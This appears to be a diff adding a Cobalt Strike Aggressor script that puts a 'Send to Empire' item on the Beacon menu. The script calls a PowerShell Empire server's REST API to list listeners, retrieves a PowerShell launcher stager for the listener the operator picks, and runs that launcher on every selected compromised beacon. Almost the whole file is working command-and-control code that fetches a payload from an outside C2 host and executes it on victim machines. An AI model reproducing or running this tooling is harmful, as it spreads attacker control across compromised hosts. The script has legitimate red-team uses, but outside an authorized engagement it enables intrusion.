@@ -1,0 +1,84 @@
+#author bluescreenofjeff
+
+# thanks to @armitagehacker and @harmj0y
+
+#Set the Empire server IP, port, and REST token Below
+#Name your listeners without spaces!
+
+
+popup beacon_bottom {
+	item "Send to Empire" {
+		global('$server_ip $server_port $rest_token');
+
+		#### CONFIGURE EMPIRE SETTINGS HERE ####
+
+		$server_ip = "127.0.0.1";
+		$server_port = "1337";
+		$rest_token = "TOKEN-GOES-HERE";
+
+		########################################
+
+		#curl list of listeners from Empire
+
+		$curl_command = exec("curl --insecure -i https://" . $server_ip . ":" . $server_port . "/api/listeners?token=" . $rest_token);
+		@listeners = readAll($curl_command);
+		closef($curl_command);
+
+		#parse listener names from output
+		foreach $key => $value (@listeners){
+			if ('"name"' isin $value){
+				$temp = split(': ',$value)[1];
+				$temp = replace($temp,',','');
+				$temp = replace($temp,'"','');
+				add(@listener_names, "$temp");
+			}
+		}
+		#throw error if no listener names found
+		if (strlen(@listener_names) <= 3){
+			show_message("[!] Error - No listeners retrieved from Empire at $server_ip port $server_port");
+			throw "[!] Error - No listeners retrieved from Empire at $server_ip port $server_port";
+		}
+
+		#prompt for Empire listener choice
+		$listener_string = replace(join(', ', @listener_names),", ", "\n   ");
+		prompt_text("Choose a listener: \n   $listener_string", @listener_names[0], lambda({
+			
+			#throw error if no listener names found
+			if (" " isin $1){
+				show_message("[!] Error - Listeners with spaces in the name are not supported");
+				throw "[!] Error - Listeners with spaces in the name are not supported";
+
+			}
+
+			#curl Empire for chosen listener's launcher
+
+			$cmd = 'curl --insecure -i -H Content-Type:application/json https://' . $server_ip . ':' . $server_port . '/api/stagers?token=' . $rest_token . ' -X POST -d {"StagerName":"launcher","Listener":"' . $1 . '"} ';
+
+			$curl_stager = exec($cmd);
+
+			@stager = readAll($curl_stager);
+			closef($curl_stager);
+
+			#parse listener names from output
+			foreach $key => $value (@stager){
+				if ('"Output"' isin $value){
+					$posh = split(': ',$value)[1];
+					$posh = replace($posh,',','');
+					$posh = replace($posh,'"','');
+				}
+			}
+
+			#issue launcher on all selected beacons
+			binput(@ids, "powershell $posh");
+			bpowershell(@ids, "$posh");
+
+		}, @ids => $1));
+
+		#clear the arrays out
+		clear(@listeners);
+		clear(@listener_names);
+		clear(@stager);
+		clear($posh);
+
+	}
+}
